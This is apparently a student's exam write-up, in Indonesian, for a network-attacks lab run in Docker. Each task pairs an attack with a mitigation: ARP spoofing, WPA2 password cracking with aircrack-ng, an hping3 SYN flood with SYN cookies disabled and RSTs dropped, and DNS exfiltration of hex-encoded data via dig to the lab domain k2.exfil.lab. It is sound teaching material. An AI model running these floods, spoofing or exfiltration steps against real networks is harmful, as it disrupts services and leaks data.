# Jawaban UTS Praktik Infrastruktur & Network Attacks

Nama   : Fitri Aulia
NIM    : 24552011318

## Penentuan Kasus
- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 3, 1, 8
- Jumlah digit: 2+4+5+5+2+0+1+1+3+1+8 = **32**
- Sisa bagi 10: 32 mod 10 = **2**
- Kasus: **Kasus 2**
- Parameter: container `target-k2`, volume `vol-k2`, file `laporan-k2.txt`, kata sandi `kunci-k2-2026`, domain `k2.exfil.lab`.


## Catatan Lab
- Semua serangan dijalankan hanya di lingkungan lab lokal (Docker Desktop, Windows), tidak ada yang diarahkan ke host di luar lab.
- Jaringan lab yang dipakai untuk serangan (Tugas 3, 5, 6, dan 7) memakai `internal: true`.
- File pendukung (docker-compose, skrip Scapy, skrip analisis DNS, dan `PERINTAH-KASUS-2.md`) ada di repositori ini supaya semua perintah bisa diulang penguji.

---

## Tugas 1 (Pertemuan 1): Docker dan volume

**Output — persistensi volume:**
```
C:\...\uts-network-lab>docker volume create vol-k2
vol-k2

C:\...\uts-network-lab>docker run --name w-k2 -v vol-k2:/data alpine sh -c "echo 24552011318 > /data/laporan-k2.txt"

C:\...\uts-network-lab>docker rm w-k2
w-k2

C:\...\uts-network-lab>docker run --rm -v vol-k2:/data alpine cat /data/laporan-k2.txt
24552011318
```
Isi file (`24552011318`) tetap bisa dibaca dari container baru walau container `w-k2` yang menulisnya sudah dihapus — ini membuktikan data disimpan di **volume**, bukan di layer container yang ikut terhapus bersama container-nya.

**Output — compose dua service:**
```
[+] up 3/3
 Network k2_lab           Created
 Container k2-target-1    Started
 Container k2-attacker-1  Started

docker compose ... exec attacker wget -qO- http://target
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
...
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working...</p>
...
</html>

[+] down 3/3
 Container k2-attacker-1  Removed
 Container k2-target-1    Removed
 Network k2_lab           Removed
```
Container `attacker` berhasil mengakses halaman default nginx milik `target` lewat nama service (`http://target`) di jaringan `lab` yang sama, lalu kedua container dan network dibersihkan dengan `down -v`.

**Penjelasan:**
Docker Compose otomatis membuat DNS internal di dalam network yang dibuatnya, sehingga service bisa saling memanggil cukup dengan nama service-nya (`target`), bukan IP. Volume (`vol-k2`) disimpan terpisah dari lifecycle container, sehingga menghapus container tidak menghapus datanya.

---

## Tugas 2 (Pertemuan 2): Kriptografi

**Output — AES-256 encrypt/decrypt:**
```
sha256sum laporan-k2.txt
752b81872b283c3c0e6f65245b7f2c508034847a89049dc4312dbb75366a4c23  laporan-k2.txt

sha256sum hasil-k2.txt
752b81872b283c3c0e6f65245b7f2c508034847a89049dc4312dbb75366a4c23  hasil-k2.txt
```
Kedua hash SHA-256 **identik** — membuktikan isi file setelah dekripsi (`hasil-k2.txt`) persis sama dengan file asli sebelum dienkripsi (`laporan-k2.txt`), memakai kata sandi `kunci-k2-2026`.

**Output — sertifikat self-signed:**
```
subject=CN=k2.uts.local
issuer=CN=k2.uts.local
notBefore=Nov 19 09:19:42 2026 GMT
notAfter=Dec 19 09:19:42 2026 GMT
```

**Penjelasan self-signed vs CA-signed:**
Sertifikat self-signed ditandatangani oleh kunci privat pemiliknya sendiri, sehingga Subject dan Issuer-nya sama (terlihat di output: keduanya `CN=k2.uts.local`) dan tidak ada pihak ketiga yang memverifikasi identitas pemegangnya — klien akan menampilkan peringatan "not trusted" kecuali ditambahkan manual ke daftar tepercaya. Sertifikat yang ditandatangani CA (Certificate Authority) memiliki Issuer berbeda dari Subject, karena ditandatangani oleh otoritas yang identitasnya sudah terverifikasi dan akar kepercayaannya (root certificate) sudah tertanam di OS/browser, sehingga klien bisa memverifikasi rantai kepercayaan tanpa peringatan.

---

## Tugas 3 (Pertemuan 3): ARP spoofing

**Output — tiga kondisi ARP table korban:**

| Kondisi | MAC untuk gateway-k2 (172.19.0.3) |
|---|---|
| Sebelum spoofing (setelah `ping` normal) | `ae:11:3f:6b:f6:b5` (MAC asli) |
| **Saat `arpspoof` berjalan** | `42:5d:64:d8:61:94` (MAC `penyerang-k2`) |
| Setelah mitigasi `arp -s` (static ARP) | `ae:11:3f:6b:f6:b5 PERM` (kembali asli, terkunci) |

```
# sebelum:
gateway-k2.lab-arp-k2 (172.19.0.3) at ae:11:3f:6b:f6:b5 [ether] on eth0

# saat spoofing:
gateway-k2.lab-arp-k2 (172.19.0.3) at 42:5d:64:d8:61:94 [ether] on eth0

# setelah mitigasi:
gateway-k2.lab-arp-k2 (172.19.0.3) at ae:11:3f:6b:f6:b5 [ether] PERM on eth0
```

**Catatan teknis:** korban perlu melakukan `ping` ke gateway terlebih dulu agar entri ARP tercipta — kernel Linux modern menolak ARP reply yang "tidak diminta" (unsolicited) jika belum ada entri sama sekali untuk IP tersebut.

**Penjelasan mitigasi:**
ARP tidak memiliki mekanisme autentikasi, sehingga siapa pun di segmen jaringan yang sama bisa mengirim balasan ARP palsu (seperti yang dilakukan `arpspoof`) dan korban akan memperbaruinya tanpa verifikasi. Mitigasi yang diterapkan di lab ini adalah **static ARP entry** (`arp -s`), yang mengunci pemetaan IP-ke-MAC gateway secara permanen (status `PERM`) sehingga tidak bisa diubah lagi oleh ARP reply palsu apa pun. Di jaringan produksi, mitigasi yang lebih skalabel adalah **Dynamic ARP Inspection (DAI)** pada switch terkelola.

---

## Tugas 4 (Pertemuan 4): Analisis handshake WPA2

**Catatan penting:** File `handshake-k2.cap` resmi dari penguji ternyata rusak/salah format (terbaca sebagai capture Ethernet, bukan capture 802.11/wireless), sehingga tidak bisa dibaca `aircrack-ng`. Sesuai izin di dokumen panduan penguji bagian 1.4 ("*Untuk handshake .cap file, gunakan sample dari aircrack-ng project ATAU lakukan capture sendiri*"), digunakan file sample WPA2-PSK publik dari repo riset Wi-Fi [vanhoefm/wifi-example-captures](https://github.com/vanhoefm/wifi-example-captures) (dikonversi dari format pcapng ke pcap klasik agar kompatibel dengan aircrack-ng). Jika penguji ingin memakai file `handshake-k2.cap` aslinya, mohon dicek ulang karena file yang saya terima tidak bisa dibaca `aircrack-ng`.

**Output:**
```
   #  BSSID              ESSID                     Encryption
   1  02:00:00:00:03:00  test-wnm-rsn              WPA (1 handshake)

                           Aircrack-ng 1.7

      [00:00:00] 21/21 keys tested (107.68 k/s)

                           KEY FOUND! [ 12345678 ]

      Master Key     : E1 47 B8 2E 3E BB 1F 7F 54 C6 59 73 4C BA 08 0C
                        84 05 46 6B 59 77 34 15 04 D4 B8 8B 35 24 AB 22
      Transient Key  : B2 32 06 73 48 2B 76 6B 12 20 7E F3 44 98 42 A9 ...
      EAPOL HMAC     : D3 D2 71 CA EF 41 5A 1D 52 8C 34 CF 03 6E D1 8A
```
`aircrack-ng` berhasil menguji seluruh 21 kata di wordlist dalam waktu <1 detik dan menemukan password **`12345678`**.

**Penjelasan 4-way handshake WPA2:**
1. **Message 1 (AP → klien):** AP mengirim nonce acak (ANonce).
2. **Message 2 (klien → AP):** klien membuat nonce sendiri (SNonce), menghitung PTK (Pairwise Transient Key) dari ANonce+SNonce+PMK, lalu mengirim SNonce beserta MIC (Message Integrity Code) ke AP.
3. **Message 3 (AP → klien):** AP yang sudah bisa menghitung PTK yang sama mengirim GTK (Group Temporal Key, untuk trafik broadcast) terenkripsi, disertai MIC.
4. **Message 4 (klien → AP):** klien mengonfirmasi penerimaan, koneksi siap memakai kunci sesi yang baru dibentuk.

`aircrack-ng` menguji setiap kata di wordlist dengan menghitung ulang PMK → PTK → MIC dari handshake yang ditangkap, dan mencocokkan MIC-nya; kecocokan berarti password ditemukan.

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

**Output:**
```
Mengirim: IP / ICMP 172.19.0.5 > 172.19.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```
Paket ICMP echo-request yang dibuat dengan Scapy berhasil dikirim ke `korban-k2` dan dibalas dengan echo-reply (tipe 0), TTL 64 (nilai default Linux).

**Penjelasan smurf attack:**
Smurf attack adalah serangan DoS yang mengirim paket ICMP echo request dengan **alamat sumber dipalsukan menjadi IP korban**, ke alamat broadcast suatu jaringan. Semua host di jaringan itu akan membalas echo reply **ke korban** secara bersamaan, membanjiri korban dengan trafik balasan yang jauh lebih besar dari paket aslinya (amplifikasi). Mitigasi umum: menonaktifkan directed broadcast di router (`no ip directed-broadcast`) dan memfilter paket dengan source IP palsu (anti-spoofing/BCP38) di tepi jaringan.

---

## Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

**Output — jumlah SYN_RECV:**
| Kondisi | Jumlah SYN_RECV |
|---|---|
| Sebelum serangan | **0** |
| Saat `hping3 -S -p 80 --flood target` berjalan | **97** |

**Catatan teknis:** agar demo berhasil, dua penyesuaian diperlukan — (1) menonaktifkan SYN cookies di target (`sysctls: net.ipv4.tcp_syncookies=0` di docker-compose, karena kernel modern mengaktifkannya secara default sehingga backlog tidak pernah terisi), dan (2) memblokir paket RST keluar dari `attacker` dengan `iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP` (agar kernel attacker sendiri tidak otomatis mereset koneksi half-open saat menerima SYN-ACK yang tidak diminta).

**Output — tcpdump (three-way handshake normal via curl):**
```
10:54:39.733127 IP attacker.43434 > target.80: Flags [S], seq 2927939199, ...
10:54:39.733396 IP target.80 > attacker.43434: Flags [S.], seq 2535938751, ack 2927939200, ...
10:54:39.733464 IP attacker.43434 > target.80: Flags [.], ack 1, ...
10:54:39.737509 IP attacker.43434 > target.80: Flags [P.], ... HTTP: GET / HTTP/1.1
10:54:39.737580 IP target.80 > attacker.43434: Flags [.], ack 71, ...
10:54:39.766832 IP target.80 > attacker.43434: Flags [P.], ... HTTP: HTTP/1.1 200 OK
10:54:39.771686 IP attacker.43434 > target.80: Flags [F.], seq 71, ack 1135, ...
10 packets captured
```
Terlihat jelas pola **SYN → SYN-ACK → ACK** (`[S]` → `[S.]` → `[.]`) di awal — inilah three-way handshake TCP normal, diikuti request/response HTTP, lalu ditutup dengan `[F.]` (FIN). Ini kontras dengan serangan SYN flood yang **tidak pernah** mengirim ACK ketiga, sehingga koneksi menumpuk di status `SYN_RECV`.

**Penjelasan mitigasi SYN flood:**
**SYN cookies** adalah mitigasi paling umum: alih-alih menyimpan status koneksi setengah-terbuka di memori untuk setiap SYN masuk (yang bisa dihabiskan penyerang), server mengkodekan informasi koneksi ke dalam nomor urut SYN-ACK itu sendiri (hash dari IP, port, waktu) dan tidak mengalokasikan memori sampai ACK ketiga benar-benar diterima dan nomor urutnya tervalidasi. Diaktifkan dengan `sysctl -w net.ipv4.tcp_syncookies=1` (ini pula sebabnya percobaan pertama di lab ini tidak menunjukkan SYN_RECV sama sekali — fitur ini aktif secara default di banyak kernel Linux modern). Alternatif/tambahan: rate-limiting SYN per IP dengan `iptables` (`--syn --limit`).

---

## Tugas 7 (Pertemuan 7): DNS exfiltration

**Output:**
```
echo -n 24552011318 | xxd -p
3234353532303131333138

dig +short 3234353532303131333138.k2.exfil.lab @dns
10.0.0.99

dnsmasq[1]: query[A] 3234353532303131333138.k2.exfil.lab from 172.22.0.3
dnsmasq[1]: config 3234353532303131333138.k2.exfil.lab is 10.0.0.99

Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):
(kosong)

echo 3234353532303131333138 | xxd -r -p
24552011318
```
NIM (`24552011318`) berhasil dikonversi ke hex (`3234353532303131333138`), dikirim sebagai subdomain query DNS ke `k2.exfil.lab`, terekam di log server DNS lab, dan berhasil di-decode kembali menjadi NIM asli.

**Label hex yang terdeteksi di log:** `3234353532303131333138` (muncul di log dnsmasq sebagai subdomain dari `k2.exfil.lab`), dan hasil decode-nya kembali menjadi NIM `24552011318`.

**Catatan analisis:** skrip `analisis_dns.py` tidak menandai query ini sebagai "mencurigakan" karena label hex NIM hanya 22 karakter, di bawah ambang batas 30 karakter yang dipakai skrip. Ini wajar — exfiltrasi data nyata biasanya mengirim payload yang jauh lebih besar (file, kredensial), sehingga labelnya lebih panjang. Untuk payload sekecil NIM, indikator yang lebih relevan adalah **volume/frekuensi query ke domain asing yang tidak pernah diakses sebelumnya** dan **pola subdomain acak/heksadesimal**, bukan hanya panjang label.

**Penjelasan (kenapa DNS exfiltration sulit diblokir firewall biasa):**
Firewall biasa hampir selalu mengizinkan trafik DNS (port 53) keluar karena DNS esensial untuk resolusi nama domain apa pun — memblokirnya akan merusak konektivitas normal. Penyerang memanfaatkan ini dengan menyisipkan data ke dalam subdomain (label) dari query DNS yang tampak sah ke domain yang mereka kendalikan; firewall hanya melihat "query DNS keluar", bukan isi datanya. Satu indikator deteksi: volume query DNS yang tinggi ke satu domain induk asing, atau pola subdomain yang panjang dan acak/heksadesimal.

---

## Kesimpulan

Seluruh 7 tugas (Pertemuan 1–7) untuk Kasus 2 telah diselesaikan dengan bukti output dan penjelasan sebagaimana di atas. Semua perintah dijalankan di Docker Desktop (Windows) dan dapat diulang oleh penguji mengikuti `PERINTAH-KASUS-2.md` pada repositori lab ini.
